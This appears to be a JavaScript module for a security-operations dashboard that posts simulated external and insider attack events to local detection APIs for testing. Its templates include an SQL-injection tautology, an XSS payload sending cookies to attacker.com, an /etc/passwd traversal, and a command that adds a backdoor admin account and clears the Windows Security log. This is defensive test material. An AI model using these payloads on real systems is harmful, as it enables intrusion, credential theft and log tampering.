import { nidsClient, insiderClient } from './apiClient';

/**
 * CASOC Attack Simulation Service
 * Sends realistic attack telemetry directly to the genuine running backends:
 * - External Attacks -> NIDS Flask API (http://localhost:5000/predict)
 * - Insider Threats  -> Insider Threat Flask API (http://localhost:5001/api/ingest)
 * 
 * Absolutely NO mock data. All requests are processed by actual LightGBM, DPI scanner,
 * Isolation Forest, SQLite audit logging, and Socket.IO emission.
 */

export const EXTERNAL_ATTACK_TEMPLATES = [
  {
    id: 'ddos_syn',
    name: 'SYN Flood / DDoS Attack',
    category: 'Network Flooding',
    severity: 'CRITICAL',
    description: 'High-volume TCP SYN packet storm with randomized source ports targeting port 80 to deplete connection state tables.',
    mitigationExpected: 'IP Rate Limiting & Flow Dropping',
    generatePayload: () => {
      const srcPort = Math.floor(1024 + Math.random() * 60000);
      const randomHost = Math.floor(10 + Math.random() * 240);
      return [
        {
          src_ip: `198.51.100.${randomHost}`,
          dst_ip: '192.168.1.10',
          src_port: srcPort,
          dst_port: 80,
          protocol: 'TCP',
          packet_length: 64,
          flow_duration: 0.002,
          payload: 'SYN_FLOOD_SIMULATED_PACKET_STREAM_ATTACK'
        }
      ];
    }
  },
  {
    id: 'sqli_admin',
    name: 'SQL Injection (SQLi) Probe',
    category: 'Web Application Attack',
    severity: 'HIGH',
    description: 'Malicious SQL tautology payload designed to bypass authentication and dump schema records.',
    mitigationExpected: 'WAF Rule Triggered & IP Blacklisted',
    generatePayload: () => [
      {
        src_ip: '203.0.113.45',
        dst_ip: '192.168.1.50',
        src_port: 48921,
        dst_port: 80,
        protocol: 'TCP',
        packet_length: 512,
        flow_duration: 0.045,
        payload: "GET /admin/login.php?user=admin' OR '1'='1' -- HTTP/1.1\r\nHost: target-server\r\nUser-Agent: sqlmap/1.7#dev"
      }
    ]
  },
  {
    id: 'xss_stored',
    name: 'Cross-Site Scripting (XSS)',
    category: 'Web Application Attack',
    severity: 'HIGH',
    description: 'Injected JavaScript script tag attempting session cookie theft and DOM manipulation.',
    mitigationExpected: 'DPI Content Filter Drop & Incident Logged',
    generatePayload: () => [
      {
        src_ip: '198.51.100.88',
        dst_ip: '192.168.1.50',
        src_port: 52140,
        dst_port: 443,
        protocol: 'TCP',
        packet_length: 380,
        flow_duration: 0.038,
        payload: 'POST /api/comments HTTP/1.1\r\nHost: target-server\r\n\r\ncomment=<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'
      }
    ]
  },
  {
    id: 'brute_force_ssh',
    name: 'SSH / Auth Brute Force',
    category: 'Credential Access',
    severity: 'HIGH',
    description: 'Rapid dictionary attack against port 22 testing common root credentials.',
    mitigationExpected: 'Port 22 Blackhole & Fail2Ban IP Lock',
    generatePayload: () => {
      const srcPort = Math.floor(30000 + Math.random() * 20000);
      return [
        {
          src_ip: '192.0.2.14',
          dst_ip: '192.168.1.22',
          src_port: srcPort,
          dst_port: 22,
          protocol: 'TCP',
          packet_length: 128,
          flow_duration: 0.015,
          payload: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\r\nFAILED_AUTH_USER_ROOT_DICT_SIMULATION'
        }
      ];
    }
  },
  {
    id: 'port_scan_syn',
    name: 'Reconnaissance Port Scan',
    category: 'Reconnaissance',
    severity: 'MEDIUM',
    description: 'Sequential rapid SYN probe across standard services (21, 22, 23, 80, 443, 3389, 8080) to detect open attack surfaces.',
    mitigationExpected: 'Recon Anomaly Flagged & Target Obfuscated',
    generatePayload: () => {
      const probePorts = [21, 22, 23, 25, 80, 443, 3306, 3389, 8080];
      const targetPort = probePorts[Math.floor(Math.random() * probePorts.length)];
      return [
        {
          src_ip: '198.51.100.99',
          dst_ip: '192.168.1.1',
          src_port: 59124,
          dst_port: targetPort,
          protocol: 'TCP',
          packet_length: 44,
          flow_duration: 0.001,
          payload: 'NMAP_TCP_SYN_STEALTH_SCAN_PROBE'
        }
      ];
    }
  },
  {
    id: 'suspicious_http',
    name: 'Suspicious HTTP Web Anomaly',
    category: 'Payload Anomaly',
    severity: 'MEDIUM',
    description: 'Anomalous HTTP request targeting sensitive system configuration files (/etc/passwd, .env).',
    mitigationExpected: 'URI Traversal Blocked & Alert Dispatched',
    generatePayload: () => [
      {
        src_ip: '203.0.113.190',
        dst_ip: '192.168.1.50',
        src_port: 41203,
        dst_port: 80,
        protocol: 'TCP',
        packet_length: 290,
        flow_duration: 0.022,
        payload: 'GET /../../../../etc/passwd HTTP/1.1\r\nHost: internal-portal\r\nAuthorization: Basic YWRtaW46YWRtaW4='
      }
    ]
  }
];

export const INSIDER_THREAT_TEMPLATES = [
  {
    id: 'abnormal_login',
    name: 'Abnormal After-Hours Login',
    category: 'Authentication Anomaly',
    severity: 'HIGH',
    description: 'User logs into critical financial databases at 03:22 AM from an unrecognized non-workstation IP address.',
    mitigationExpected: 'MFA Step-Up Required & Session Flagged',
    generatePayload: () => ({
      user_id: 'USR-CORP-01',
      username: 'internal.analyst',
      department: 'Finance',
      action: 'database_login',
      resource: 'FIN_ORACLE_PROD_DB',
      risk_indicators: ['after_hours', 'unusual_ip', 'elevated_privilege'],
      timestamp: new Date().toISOString(),
      details: 'Off-hours database access detected at anomalous shift window.'
    })
  },
  {
    id: 'mass_file_access',
    name: 'Mass File Access Spike',
    category: 'Data Access Anomaly',
    severity: 'HIGH',
    description: 'Employee accessing over 450 proprietary source code repositories within a 2-minute window.',
    mitigationExpected: 'Temporary File Read Throttle & Alert to SecOps',
    generatePayload: () => ({
      user_id: 'USR-ENG-01',
      username: 'dev.engineer',
      department: 'Engineering',
      action: 'mass_file_read',
      resource: '/srv/git/core-ip-patents/',
      file_count: Math.floor(350 + Math.random() * 200),
      risk_indicators: ['high_velocity_read', 'intellectual_property'],
      timestamp: new Date().toISOString(),
      details: 'Rapid traversal and batch reading of core intellectual property repositories.'
    })
  },
  {
    id: 'mass_download_exfil',
    name: 'Data Exfiltration / Mass Download',
    category: 'Exfiltration',
    severity: 'CRITICAL',
    description: 'Downloading 4.8 GB of encrypted customer PII and credential archives to a personal storage device.',
    mitigationExpected: 'Network Egress Cutoff & DLP Lockdown',
    generatePayload: () => ({
      user_id: 'USR-FIN-02',
      username: 'support.staff',
      department: 'Customer Success',
      action: 'bulk_archive_download',
      resource: 's3://corp-pii-backups/2026/clients.tar.gz',
      data_size_mb: Math.floor(3500 + Math.random() * 2500),
      risk_indicators: ['bulk_download', 'sensitive_data', 'resignation_notice'],
      timestamp: new Date().toISOString(),
      details: 'Large compressed archive extraction containing client records.'
    })
  },
  {
    id: 'unauthorized_access',
    name: 'Unauthorized Directory Traversal',
    category: 'Access Control',
    severity: 'MEDIUM',
    description: 'Junior contractor attempting to view HR disciplinary and executive compensation folders.',
    mitigationExpected: 'Access Denied & Incident Ticket Created',
    generatePayload: () => ({
      user_id: 'USR-CTR-03',
      username: 'contractor.external',
      department: 'Contract Staff',
      action: 'access_denied_attempt',
      resource: '/shared/executive/compensation_2026.xlsx',
      risk_indicators: ['forbidden_path', 'repeated_rejection'],
      timestamp: new Date().toISOString(),
      details: 'Repeated unauthorized traversal against restricted executive shared drives.'
    })
  },
  {
    id: 'privilege_misuse',
    name: 'Administrative Privilege Misuse',
    category: 'Privilege Abuse',
    severity: 'CRITICAL',
    description: 'Sysadmin creating unauthorized shadow domain-admin accounts and clearing local event logs.',
    mitigationExpected: 'Account Revocation & SOC Priority-1 Alert',
    generatePayload: () => ({
      user_id: 'USR-ADM-04',
      username: 'admin.infrastructure',
      department: 'IT Infrastructure',
      action: 'privilege_escalation',
      resource: 'ACTIVE_DIRECTORY_DC01',
      command: 'net user backdoor_sec Pa$$w0rd! /add && wevtutil cl Security',
      risk_indicators: ['shadow_account', 'log_tampering', 'admin_abuse'],
      timestamp: new Date().toISOString(),
      details: 'Creation of secondary privileged credentials coupled with security log purge.'
    })
  },
  {
    id: 'suspicious_device',
    name: 'Rogue USB / Removable Media Insertion',
    category: 'Endpoint Security',
    severity: 'MEDIUM',
    description: 'Unregistered foreign mass storage device plugged into secure workstation in R&D cleanroom.',
    mitigationExpected: 'USB Port Disabled via Endpoint Agent',
    generatePayload: () => ({
      user_id: 'USR-LAB-05',
      username: 'lab.technician',
      department: 'Research & Development',
      action: 'unauthorized_hardware_connect',
      resource: 'STATION-RD-04',
      hardware_id: 'USB\\VID_0781&PID_5583\\SANDISK_ULTRA_UNAUTHORIZED',
      risk_indicators: ['unapproved_hardware', 'data_loss_risk'],
      timestamp: new Date().toISOString(),
      details: 'Connection of unvetted portable flash media to restricted hardware terminal.'
    })
  }
];

export const MULTI_STAGE_SCENARIOS = [
  {
    id: 'scenario_web_breach',
    title: 'Scenario 1: External Web Application Breach',
    description: 'Realistic multi-stage cyber campaign moving from reconnaissance to SQL injection, privilege compromise, and active defense isolation.',
    stages: [
      {
        step: 1,
        name: 'Target Reconnaissance',
        targetType: 'external',
        templateId: 'port_scan_syn',
        explanation: 'Attacker scans public facing ports to identify vulnerable HTTP services.'
      },
      {
        step: 2,
        name: 'Database Exploitation',
        targetType: 'external',
        templateId: 'sqli_admin',
        explanation: 'Attacker injects SQL syntax into login portal to bypass authentication.'
      },
      {
        step: 3,
        name: 'Credential Brute Force',
        targetType: 'external',
        templateId: 'brute_force_ssh',
        explanation: 'Attacker leverages leaked credentials to brute-force management SSH service.'
      },
      {
        step: 4,
        name: 'Denial of Service Diversion',
        targetType: 'external',
        templateId: 'ddos_syn',
        explanation: 'Attacker launches TCP SYN flood to distract security analysts while maintaining persistence.'
      }
    ]
  },
  {
    id: 'scenario_insider_espionage',
    title: 'Scenario 2: Insider Data Theft & Espionage',
    description: 'Disgruntled employee exfiltrating confidential intellectual property and customer records prior to departure.',
    stages: [
      {
        step: 1,
        name: 'Off-Hours Anomalous Login',
        targetType: 'insider',
        templateId: 'abnormal_login',
        explanation: 'User accesses corporate intranet at 3:00 AM outside normal working hours.'
      },
      {
        step: 2,
        name: 'Mass File Repository Traversal',
        targetType: 'insider',
        templateId: 'mass_file_access',
        explanation: 'User rapidly browses through proprietary patent folders and technical blueprints.'
      },
      {
        step: 3,
        name: 'Bulk Data Exfiltration',
        targetType: 'insider',
        templateId: 'mass_download_exfil',
        explanation: 'User attempts to download multi-gigabyte client database archive.'
      },
      {
        step: 4,
        name: 'Evidence Tampering',
        targetType: 'insider',
        templateId: 'privilege_misuse',
        explanation: 'User attempts to escalate privileges and clear workstation access audit logs.'
      }
    ]
  },
  {
    id: 'scenario_blended_apt',
    title: 'Scenario 3: Blended Advanced Persistent Threat (APT)',
    description: 'Coordinated attack combining external application exploitation with compromised insider credentials.',
    stages: [
      {
        step: 1,
        name: 'External Reconnaissance Probe',
        targetType: 'external',
        templateId: 'port_scan_syn',
        explanation: 'External actor scans edge perimeter.'
      },
      {
        step: 2,
        name: 'Suspicious Web Traversal',
        targetType: 'external',
        templateId: 'suspicious_http',
        explanation: 'Directory traversal against web servers to locate sensitive credentials.'
      },
      {
        step: 3,
        name: 'Insider Privilege Abuse',
        targetType: 'insider',
        templateId: 'privilege_misuse',
        explanation: 'Compromised administrative account executes privilege escalation commands.'
      },
      {
        step: 4,
        name: 'High-Volume DDoS Saturation',
        targetType: 'external',
        templateId: 'ddos_syn',
        explanation: 'Flood attack deployed to saturate network bandwidth and mask exfiltration.'
      }
    ]
  }
];

/**
 * Execute an External Attack against Port 5000 /predict
 */
export async function executeExternalAttack(template) {
  const payload = template.generatePayload();
  const startTime = performance.now();

  try {
    const res = await nidsClient.post('/predict', payload);
    const endTime = performance.now();
    const latencyMs = Math.round(endTime - startTime);

    return {
      success: true,
      attackId: template.id,
      name: template.name,
      targetType: 'external',
      endpoint: 'POST http://localhost:5005/predict',
      latencyMs,
      payloadSent: payload,
      backendResponse: res.data,
      timestamp: new Date().toISOString()
    };
  } catch (err) {
    const endTime = performance.now();
    return {
      success: false,
      attackId: template.id,
      name: template.name,
      targetType: 'external',
      endpoint: 'POST http://localhost:5005/predict',
      latencyMs: Math.round(endTime - startTime),
      error: err.response?.data?.message || err.message || 'Connection failed to NIDS API',
      timestamp: new Date().toISOString()
    };
  }
}

/**
 * Execute an Insider Threat Event against Port 5001 /api/ingest
 */
export async function executeInsiderThreat(template) {
  const payload = template.generatePayload();
  const startTime = performance.now();

  try {
    const [res5001, res5000] = await Promise.allSettled([
      insiderClient.post('/api/ingest', payload),
      nidsClient.post('/api/ingest_insider', payload)
    ]);
    const endTime = performance.now();
    const latencyMs = Math.round(endTime - startTime);
    const backendData = res5000.status === 'fulfilled' ? res5000.value.data : (res5001.status === 'fulfilled' ? res5001.value.data : {});

    return {
      success: true,
      attackId: template.id,
      name: template.name,
      targetType: 'insider',
      endpoint: 'POST http://localhost:5001/api/ingest & :5005/api/ingest_insider',
      latencyMs,
      payloadSent: payload,
      backendResponse: backendData,
      timestamp: new Date().toISOString()
    };
  } catch (err) {
    const endTime = performance.now();
    return {
      success: false,
      attackId: template.id,
      name: template.name,
      targetType: 'insider',
      endpoint: 'POST http://localhost:5001/api/ingest',
      latencyMs: Math.round(endTime - startTime),
      error: err.response?.data?.message || err.message || 'Connection failed to Insider Threat API',
      timestamp: new Date().toISOString()
    };
  }
}
